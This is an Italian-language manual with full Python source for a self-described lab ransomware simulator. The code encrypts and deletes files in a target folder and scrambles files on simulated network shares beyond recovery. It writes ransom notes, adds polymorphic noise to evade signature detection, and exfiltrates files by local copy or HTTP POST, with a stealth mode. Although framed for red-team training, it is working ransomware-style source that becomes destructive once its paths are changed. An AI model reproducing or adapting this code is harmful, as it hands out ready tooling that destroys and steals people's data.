# 📖 **SimLab Framework v2**  
## **Manuale Tecnico di Utilizzo**  
**Autore:** *Mario Protopapa*  
**Destinazione d’uso:** Laboratori Red Team, Test di Detection e Incident Response  
**Licenza:** Solo per utilizzo etico su infrastrutture controllate e autorizzate.

## 🛠️ **Introduzione**

Questo strumento, denominato **SimLab Framework v2**, è stato **progettato e realizzato da me** come simulatore avanzato di attività ransomware ed esfiltrazione dati all’interno di ambienti di laboratorio, per supportare:
- Test di resilienza dei sistemi di difesa.
- Addestramento dei team SOC (Security Operation Center).
- Esercitazioni di red teaming strutturato.

La caratteristica principale del framework è l'**adozione di tecniche polimorfiche**, finalizzate a:
- Evasione delle detection statiche basate su firme.
- Variazione dinamica delle azioni a ogni esecuzione.

## 🔍 **Caratteristiche Tecniche Principali**

| Modulo | Descrizione |
|:---|:---|
| **Cifratura AES** | Crittografia dei file locali usando AES-256 in modalità CBC. |
| **Polimorfismo** | Funzione di cifratura con ordine dinamico, iniezione di rumore casuale nei file cifrati, mutazione dei contenuti delle ransom note. |
| **Propagazione** | Simulazione di infezione su directory di rete (`lab_share1`, `lab_share2`) tramite scrambling di file. |
| **Esfiltrazione** | Simulazione di furto dati via copia locale o HTTP POST su server interno. |
| **Decrittazione** | Ripristino completo dei dati cifrati, utilizzando la chiave originale. |
| **Stealth Mode** | Possibilità di operare in modalità silenziosa, senza output a console. |

## ⚙️ **Requisiti Tecnici**

- **Python** ≥ 3.7
- **Librerie Python richieste:**
  - `pycryptodome` (`pip install pycryptodome`)
  - `requests` (`pip install requests`)
- **Sistema Operativo:** Windows o Linux.
- **Permessi:** Accesso in scrittura e cancellazione nelle cartelle di test.

## 🧩 **Struttura del Framework**

```plaintext
simlab_framework.py
|
├── test_folder/        (Cartella bersaglio)
├── lab_share1/         (Simulazione di share di rete)
├── lab_share2/         (Simulazione di share di rete)
├── exfiltrated_data/   (Contenitore dei file esfiltrati, creato automaticamente)
├── uploaded/           (Se si utilizza server Flask per esfiltrazione HTTP)
```

## 🧠 **Descrizione dettagliata dei Moduli**

### 1. **Encrypt Files (Polymorphic AES)**
- I file vengono raccolti dinamicamente.
- L’ordine di cifratura viene **randomizzato** a ogni esecuzione (`random.shuffle`).
- Ogni file cifrato riceve:
  - **IV casuale**.
  - **Noise injection**: da 10 a 100 byte casuali aggiunti dopo il blocco crittografato.
- Alla fine, viene creata una **ransom note mutante**, con ID univoco casuale.

### 2. **Propagate Encryption to Shares**
- Simula una propagazione del ransomware sui shares di rete locali.
- Viene applicato uno **scrambling randomico** sui dati dei file.
- Genera una nuova ransom note per ogni share compromesso.

### 3. **Exfiltrate Files (Local Copy o HTTP POST)**
- **Modalità Local:** Copia i file selezionati nella directory `exfiltrated_data/`.
- **Modalità HTTP:** Invia i file tramite `POST` verso un server Flask interno (server da avviare manualmente).

### 4. **Decrypt Files**
- I file cifrati possono essere completamente ripristinati usando la password simmetrica definita (`PASSWORD`).
- Il modulo di decrittazione ignora automaticamente il rumore iniettato.

### 5. **Stealth Mode**
- Se attivata, il framework opera senza stampare alcun messaggio a console.
- Serve per simulazioni più realistiche di attacchi "low noise".

## 📋 **Procedura di Utilizzo**

1. **Setup:**
   - Crea le cartelle `test_folder`, `lab_share1`, `lab_share2`.
   - Inserisci file di test all’interno di queste cartelle.
2. **Installazione librerie:**
   ```bash
   pip install pycryptodome requests
   ```
3. **(Opzionale) Avvia server Flask se vuoi testare esfiltrazione HTTP:**
   ```bash
   python server_flask.py
   ```
4. **Avvio del framework:**
   ```bash
   python simlab_framework.py
   ```
5. **Navigazione menu:**
   - Seleziona le operazioni da effettuare.
   - Puoi cifrare, propagare, esfiltrare o decriptare i dati.

## 🧩 **Architettura Interna del Polimorfismo**

| Meccanismo | Implementazione |
|:---|:---|
| Shuffling Funzionale | `random.shuffle(files)` per ordine di cifratura. |
| Noise Injection | `get_random_bytes(random.randint(10, 100))` in aggiunta al payload cifrato. |
| Mutation Ransom Note | Randomizzazione del testo e inserimento ID dinamico. |

**Nota:** Ogni singola esecuzione produce file con **hash diversi**.

## 🛡️ **Considerazioni di Sicurezza**

- **Ambiente:** Questo framework va utilizzato **solo in ambienti di laboratorio chiuso**.
- **Nessuna Esfiltrazione Esterna:** L'esfiltrazione HTTP è verso server interni; non viene mai usata Internet.
- **Etica:** L’uso in produzione o contro sistemi senza autorizzazione costituisce violazione di legge.

## 📈 **Applicazioni in Red Teaming**

- **Test delle detection EDR/SIEM.**
- **Simulazione di kill-chain ransomware realistica.**
- **Addestramento alla risposta ad incidenti.**
- **Valutazione della resilienza di backup e piani di disaster recovery.**
- **Verifica di strumenti di Network Monitoring e DLP.**

## ** Source Code**
```python
import os
import sys
import time
import random
import shutil
import hashlib
import string
import requests
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# === CONFIGURAZIONE GLOBALE ===
TARGET_FOLDER = "./test_folder"
SHARE_PATHS = ["./lab_share1", "./lab_share2"]
EXFILTRATED_FOLDER = "./exfiltrated_data"
SERVER_URL = "http://127.0.0.1:5000/upload"
PASSWORD = "SuperSecureLabPassword!"
KEY = hashlib.sha256(PASSWORD.encode()).digest()
ENCRYPTED_EXTENSION = ".enc"
RANSOM_NOTE_NAME = "READ_ME_RESTORE.txt"

STEALTH_MODE = False  # Set True per nessun output console


# === BANNER INIZIALE ===
def print_banner():
    banner = """
    ███████╗██╗███╗   ███╗██╗      █████╗ ██████╗ 
    ██╔════╝██║████╗ ████║██║     ██╔══██╗██╔══██╗
    █████╗  ██║██╔████╔██║██║     ███████║██║  ██║
    ██╔══╝  ██║██║╚██╔╝██║██║     ██╔══██║██║  ██║
    ██║     ██║██║ ╚═╝ ██║███████╗██║  ██║██████╔╝
    ╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ 

            SimLab Framework v2 - POLYMORPHIC Edition - Mario Protopapa
    """
    print(banner)


# === UTILITIES COMUNI ===

def stealth_print(message):
    if not STEALTH_MODE:
        print(message)


def pad(data):
    length = 16 - (len(data) % 16)
    return data + bytes([length]) * length


def unpad(data):
    return data[:-data[-1]]


def create_ransom_note_polymorphic(folder):
    ransom_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    messages = [
        "All your files have been encrypted. Good luck.",
        "Oops! Files encrypted. Recovery possible.",
        "Critical error: your files are now encrypted."
    ]
    note = f"""
    === SIMULATED RANSOMWARE NOTICE ===

    {random.choice(messages)}

    Your ID: {ransom_id}

    Password to recover: {PASSWORD}

    (This is a simulated lab exercise)
    """
    path = os.path.join(folder, RANSOM_NOTE_NAME)
    with open(path, 'w') as f:
        f.write(note.strip())
    stealth_print(f"[+] Ransom note created at {path}")


# === MODULI ===

def encrypt_file(filepath):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        iv = get_random_bytes(16)
        cipher = AES.new(KEY, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(pad(data))
        noise = get_random_bytes(random.randint(10, 100))
        final_content = iv + encrypted + noise
        with open(filepath + ENCRYPTED_EXTENSION, 'wb') as f:
            f.write(final_content)
        os.remove(filepath)
        stealth_print(f"[+] Encrypted with noise {filepath}")
    except Exception as e:
        stealth_print(f"[-] Encryption failed: {e}")


def decrypt_file(filepath):
    try:
        with open(filepath, 'rb') as f:
            iv = f.read(16)
            encrypted = f.read()
        cipher = AES.new(KEY, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(encrypted[:-(len(encrypted) % 16)]))
        original = filepath.replace(ENCRYPTED_EXTENSION, "")
        with open(original, 'wb') as f:
            f.write(decrypted)
        os.remove(filepath)
        stealth_print(f"[+] Decrypted {filepath}")
    except Exception as e:
        stealth_print(f"[-] Decryption failed: {e}")


def simulate_encryption():
    stealth_print("[*] Encrypting files polymorphically...")
    files = []
    for root, dirs, filelist in os.walk(TARGET_FOLDER):
        for file in filelist:
            if not file.endswith(ENCRYPTED_EXTENSION) and not file == RANSOM_NOTE_NAME:
                files.append(os.path.join(root, file))
    random.shuffle(files)
    for f in files:
        encrypt_file(f)
    create_ransom_note_polymorphic(TARGET_FOLDER)
    stealth_print("[*] Encryption complete.")


def simulate_decryption():
    stealth_print("[*] Decrypting files...")
    for root, dirs, filelist in os.walk(TARGET_FOLDER):
        for file in filelist:
            if file.endswith(ENCRYPTED_EXTENSION):
                decrypt_file(os.path.join(root, file))
    stealth_print("[*] Decryption complete.")


def scramble_data(data):
    scrambled = bytearray(data)
    random.shuffle(scrambled)
    return bytes(scrambled)


def propagate_encryption():
    stealth_print("[*] Propagating to shares...")
    for share in SHARE_PATHS:
        if os.path.exists(share):
            for root, dirs, filelist in os.walk(share):
                for file in filelist:
                    if not file.endswith(ENCRYPTED_EXTENSION):
                        try:
                            with open(os.path.join(root, file), 'rb') as f:
                                data = f.read()
                            scrambled = scramble_data(data)
                            with open(os.path.join(root, file) + ENCRYPTED_EXTENSION, 'wb') as f:
                                f.write(scrambled)
                            os.remove(os.path.join(root, file))
                            stealth_print(f"[+] Propagated {file}")
                        except Exception as e:
                            stealth_print(f"[-] Propagation failed: {e}")
            create_ransom_note_polymorphic(share)
    stealth_print("[*] Propagation finished.")


def exfiltrate_file_local(filepath):
    if not os.path.exists(EXFILTRATED_FOLDER):
        os.makedirs(EXFILTRATED_FOLDER)
    shutil.copy(filepath, EXFILTRATED_FOLDER)
    stealth_print(f"[+] Locally exfiltrated {filepath}")


def exfiltrate_file_http(filepath):
    try:
        with open(filepath, 'rb') as f:
            files = {'file': (os.path.basename(filepath), f)}
            response = requests.post(SERVER_URL, files=files)
            if response.status_code == 200:
                stealth_print(f"[+] Exfiltrated via HTTP {filepath}")
            else:
                stealth_print(f"[-] HTTP exfiltration failed {filepath}")
    except Exception as e:
        stealth_print(f"[-] HTTP exfiltration error: {e}")


def simulate_exfiltration(mode="local"):
    stealth_print(f"[*] Exfiltrating files ({mode})...")
    for root, dirs, filelist in os.walk(TARGET_FOLDER):
        for file in filelist:
            if not file.endswith(ENCRYPTED_EXTENSION) and not file == RANSOM_NOTE_NAME:
                filepath = os.path.join(root, file)
                if mode == "local":
                    exfiltrate_file_local(filepath)
                elif mode == "http":
                    exfiltrate_file_http(filepath)
    stealth_print("[*] Exfiltration finished.")


# === MENU ===

def main_menu():
    global STEALTH_MODE
    print_banner()
    while True:
        print("""
        === Main Menu ===

        1. Encrypt Files (Polymorphic AES)
        2. Propagate to Network Shares
        3. Exfiltrate Files (Local Copy)
        4. Exfiltrate Files (HTTP POST)
        5. Decrypt Files
        6. Toggle Stealth Mode (Current: {})
        7. Exit
        """.format("ON" if STEALTH_MODE else "OFF"))

        choice = input("Select an option: ").strip()

        if choice == "1":
            simulate_encryption()
        elif choice == "2":
            propagate_encryption()
        elif choice == "3":
            simulate_exfiltration(mode="local")
        elif choice == "4":
            simulate_exfiltration(mode="http")
        elif choice == "5":
            simulate_decryption()
        elif choice == "6":
            STEALTH_MODE = not STEALTH_MODE
            stealth_print(f"[!] Stealth Mode is now {'ON' if STEALTH_MODE else 'OFF'}")
        elif choice == "7":
            stealth_print("Exiting SimLab Framework v2. Goodbye!")
            sys.exit(0)
        else:
            print("Invalid choice. Please try again.")


if __name__ == "__main__":
    main_menu()
```
Ho progettato e realizzato **SimLab Framework v2** come strumento avanzato di simulazione ransomware, pensato per riflettere metodologie reali in modo sicuro e controllato.  
L’integrazione di tecniche polimorfiche e stealth garantisce che i test di detection e risposta siano estremamente vicini agli scenari reali moderni.

